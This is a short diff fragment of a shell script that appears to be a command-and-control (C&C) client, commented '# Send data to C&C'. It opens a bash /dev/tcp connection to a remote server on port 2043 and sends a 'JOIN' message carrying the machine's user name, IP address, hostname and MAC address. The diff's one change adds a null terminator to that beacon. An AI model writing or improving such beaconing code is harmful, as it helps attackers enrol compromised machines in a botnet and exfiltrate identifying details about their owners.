@@ -32,7 +32,7 @@ PORT=2043
 
 # Send data to C&C
 exec 3<>/dev/tcp/$SERVER/$PORT
-printf "JOIN: $USER $IP $HOSTNAME $MAC" >&3
+printf "JOIN: $USER $IP $HOSTNAME $MAC\0" >&3
 
 # Print response
 # Timeout after 3s if no response
